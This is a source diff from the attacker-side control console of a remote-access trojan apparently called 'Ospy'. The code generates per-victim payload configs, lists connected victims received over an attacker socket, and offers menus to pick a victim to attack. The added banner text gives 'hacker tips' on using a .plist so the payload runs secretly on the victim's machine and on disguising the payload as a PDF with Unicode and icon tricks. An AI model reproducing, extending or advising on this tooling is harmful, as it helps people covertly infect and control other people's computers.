@@ -25,13 +25,15 @@ void create_new_payload(){
 	char payload_folder_path[15 + MAX_USER_NAME_LEN];
 	do {
 		print_small_banner();
-		printf("\n[✚] create new payload ....\n");
+		print_rocket_ship_image();
+		printf("\033[4;37m\033[1m\033[37mCreate new payload ...\033[0m\n");
 		printf("    Enter vicim name : ");
+		
 		safe_scan(&victim_name, MAX_USER_NAME_LEN);
 		if (valid_victim_name(victim_name))
 			break;
 		else {
-			printf("\n[-] \033[31;1mInvalid input, victim name may include 'a'-'z', 'A'-'Z', '_' only\033[0m\n");
+			printf("\n[\033[31;1m-\033[0m] \033[31;1mInvalid input, victim name may include 'a'-'z', 'A'-'Z', '_' only\033[0m\n");
 			press_enter_to_continue();
 		} 		
 	} while (1);
@@ -46,14 +48,14 @@ void create_new_payload(){
 		ori_mac_mini ( this is the victim_name)
 		16b1c83de8f9518e673838b2d6ea75dc ( this is the md5 hash of the name of the attacker)
 	*/
-	sprintf(commend, "Ospy/%s/payload/config",victim_name);
+	sprintf(commend, "Ospy/%s/payload/config", victim_name);
 	config_file = fopen(commend, "wt");
 	fprintf(config_file, "%s\n", victim_name); 
 	fprintf(config_file, "%s", md5(attacker_username)); 
 	fclose(config_file);	
 	
 	print_small_banner();
-	printf("\033[31;1m███████▀▀▀░░░░░░░▀▀▀███████\033[0m  \033[32;1mYES ! the payload saved successfully.\033[0m\n\033[31;1m████▀░░░░░░░░░░░░░░░░░▀████\033[0m  You can find the payload in Ospy folder.\n\033[31;1m███│░░░░░░░░░░░░░░░░░░░│███\033[0m  [»] Ospy folder path : %s/Ospy\n\033[31;1m██▌│░░░░░░░░░░░░░░░░░░░│▐██\033[0m\n\033[31;1m██░└┐░░░░░░░░░░░░░░░░░┌┘░██\033[0m  \033[4;37m\033[1m\033[37mHere some hacker tips for great Ospy infect :\033[0m\n\033[31;1m██░░└┐░░░░░░░░░░░░░░░┌┘░░██\033[0m\n\033[31;1m██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██\033[0m  * \x1B[36mfishing\033[0m\n\033[31;1m██▌░│██████▌░░░▐██████│░▐██\033[0m    is simply dummy text of the printing and\n\033[31;1m███░│▐███▀▀░░▄░░▀▀███▌│░███\033[0m    typesetting industry. Lorem Ipsum has been\n\033[31;1m██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██\033[0m    the industrysstandard dummy\n\033[31;1m██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██\033[0m  * \x1B[36minfect\033[0m\n\033[31;1m████▄─┘██▌░░░░░░░▐██└─▄████\033[0m    is simply dummy text of the printing and\n\033[31;1m█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████\033[0m    typesetting industry. Lorem Ipsum has been\n\033[31;1m████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████\033[0m\n\033[31;1m█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████\033[0m\n\033[31;1m███████▄░░░░░░░░░░░▄███████\033[0m\n\033[31;1m██████████▄▄▄▄▄▄▄██████████\033[0m  GOOD LUCK\n",pwd);
+	printf("\033[31;1m███████▀▀▀░░░░░░░▀▀▀███████\033[0m  \033[32;1mYES ! the payload saved successfully.\033[0m\n\033[31;1m████▀░░░░░░░░░░░░░░░░░▀████\033[0m  You can find the payload in Ospy folder.\n\033[31;1m███│░░░░░░░░░░░░░░░░░░░│███\033[0m  [»] Ospy folder path : %s/Ospy\n\033[31;1m██▌│░░░░░░░░░░░░░░░░░░░│▐██\033[0m\n\033[31;1m██░└┐░░░░░░░░░░░░░░░░░┌┘░██\033[0m  \033[4;37m\033[1m\033[37mHere some hacker tips for great Ospy infect :\033[0m\n\033[31;1m██░░└┐░░░░░░░░░░░░░░░┌┘░░██\033[0m\n\033[31;1m██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██\033[0m  * \x1B[36mPlist\033[0m\n\033[31;1m██▌░│██████▌░░░▐██████│░▐██\033[0m    We will use .plist to tall the victim\n\033[31;1m███░│▐███▀▀░░▄░░▀▀███▌│░███\033[0m    computer to run the payload secretly\n\033[31;1m██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██\033[0m    as long as the computer runs\n\033[31;1m██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██\033[0m\n\033[31;1m████▄─┘██▌░░░░░░░▐██└─▄████\033[0m  * \x1B[36mFake PDF trojan\033[0m\n\033[31;1m█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████\033[0m    The malicious payload can be created and\n\033[31;1m████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████\033[0m    disguised to appear as a legitimate PDF using\n\033[31;1m█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████\033[0m    a few Unicode and icon manipulation tricks\n\033[31;1m███████▄░░░░░░░░░░░▄███████\033[0m\n\033[31;1m██████████▄▄▄▄▄▄▄██████████\033[0m  \033[4;37mFOR THE FULL GUIDE PRESS HERE\033[0m\n",pwd);
 }
 
 void choose_attack_menu (){
@@ -71,16 +73,21 @@ void choose_attack_menu (){
 }
 
 void print_all_connected_victims(){
+	bool more_then_one_victim = false;
 	print_small_banner();
 	A_2_S_encrypted_message_handler(data, GET_CONNECTED_VICTM);
 	printf("\033[4;37m\033[1m\033[37mSelect victim or other option - \033[0m\n");
 	printf("\n  \033[4;37mConnected victims list : \033[0m\n");
 	recv(attacker_socket, &connected_victims, sizeof(connected_victims), 0);
 	for(int i = 0; i < MAX_VICTIMS_PER_ATTACKER; i++){
-		if (strcmp(connected_victims[i], "") != 0)
+		if (strcmp(connected_victims[i], "") != 0){
 			printf("    [%d] %s\n", i, connected_victims[i]);
-		fflush(stdout);
-	}		
+			fflush(stdout);
+			more_then_one_victim = true;
+		}
+	}
+	if(!more_then_one_victim)
+		printf("    [\033[31;1m-\033[0m] you have 0 connected victims ...\n");
 	printf("\n  \033[4;37mOther options - \033[0m\n");
 	printf("    [A] Add new victim\n");
 	printf("    [R] Reload connected victims list\n");
@@ -100,14 +107,14 @@ void choose_victim (){
 			break;
 			
 		if (attacker_selection < '0' || attacker_selection > '9'){
-			printf("\n[-] \033[31;1mInvalid input, try again...\033[0m\n");
+			printf("\n[\033[31;1m-\033[0m] \033[31;1mInvalid input, try again...\033[0m\n");
 			sleep(2);
 			continue;
 		}
 		if (strcmp(connected_victims[attacker_selection - '0'], "") != 0)
 			break;
 			
-		printf("\n[-] \033[31;1mNo such victim, try again...\033[0m\n");
+		printf("\n[\033[31;1m-\033[0m] \033[31;1mNo such victim, try again...\033[0m\n");
 		sleep(2);
 	}
 	
